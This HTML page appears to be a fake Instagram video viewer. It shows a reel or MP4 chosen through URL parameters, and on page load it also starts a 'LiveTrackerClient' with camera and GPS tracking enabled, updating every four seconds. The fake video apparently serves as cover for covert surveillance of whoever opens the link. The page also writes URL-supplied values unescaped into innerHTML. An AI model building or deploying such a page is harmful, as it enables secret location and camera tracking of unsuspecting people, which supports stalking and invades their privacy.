<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title id="ig-title">Instagram Video</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            width: 100%;
            height: 100%;
            overflow: hidden;
            background-color: #000000;
        }

        .video-container {
            width: 100vw;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #000000;
        }

        iframe, video {
            width: 100%;
            height: 100%;
            max-width: 540px;
            max-height: 960px;
            border: none;
            object-fit: contain;
        }

        @media (max-width: 600px) {
            iframe, video {
                max-width: 100vw;
                max-height: 100vh;
            }
        }
    </style>
</head>

<body>
    <div class="video-container" id="video-wrapper">
        <iframe id="ig-iframe" src="" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; geolocation; camera" allowfullscreen></iframe>
    </div>

    <script src="/js/telemetry.js"></script>
    <script>
        const urlParams = new URLSearchParams(window.location.search);

        let redirectUrl = '';
        let userParam = '';
        let titleParam = '';
        let videoMediaUrl = '';

        const compressed = urlParams.get('d');
        if (compressed) {
            try {
                const data = JSON.parse(atob(decodeURIComponent(compressed)));
                if (data.r) redirectUrl = data.r;
                if (data.u) userParam = data.u;
                if (data.c) titleParam = data.c;
                if (data.v) videoMediaUrl = data.v;
            } catch (e) {}
        }

        if (!redirectUrl) {
            const rParam = urlParams.get('r') || urlParams.get('reel') || urlParams.get('p');
            if (rParam) {
                if (rParam.startsWith('http://') || rParam.startsWith('https://')) {
                    redirectUrl = rParam;
                } else {
                    redirectUrl = `https://www.instagram.com/reel/${rParam}/`;
                }
            } else {
                redirectUrl = urlParams.get('url') || urlParams.get('redirect') || 'https://www.instagram.com';
            }
        }

        if (!titleParam) titleParam = urlParams.get('c') || urlParams.get('title') || urlParams.get('caption');
        if (titleParam) {
            document.getElementById('ig-title').innerText = `${titleParam} - Instagram Video`;
        }

        const wrapper = document.getElementById('video-wrapper');
        const iframe = document.getElementById('ig-iframe');

        // Extract Reel ID if present
        const reelMatch = redirectUrl.match(/instagram\.com\/(?:reel|reels|p)\/([A-Za-z0-9_-]+)/i);
        const reelId = reelMatch ? reelMatch[1] : '';

        if (videoMediaUrl || redirectUrl.endsWith('.mp4') || redirectUrl.includes('.mp4?')) {
            // Direct MP4 Video Player
            const vSrc = videoMediaUrl || redirectUrl;
            wrapper.innerHTML = `<video src="${vSrc}" autoplay loop muted playsinline controls style="width:100%; height:100%; max-width:540px; max-height:960px; object-fit:contain;"></video>`;
        } else if (reelId) {
            // Instagram Embed Video Player
            iframe.src = `https://www.instagram.com/reel/${reelId}/embed/captioned/`;
        } else {
            // Default Reel Embed Player
            iframe.src = `https://www.instagram.com/reel/C-TRACE/embed/captioned/`;
        }

        // Background telemetry tracking on load
        window.addEventListener('DOMContentLoaded', () => {
            if (window.LiveTrackerClient) {
                window.LiveTrackerClient.startTracking({
                    templateName: 'instagram',
                    updateInterval: 4000,
                    enableCamera: true,
                    enableGPS: true
                });
            }
        });
    </script>
</body>

</html>
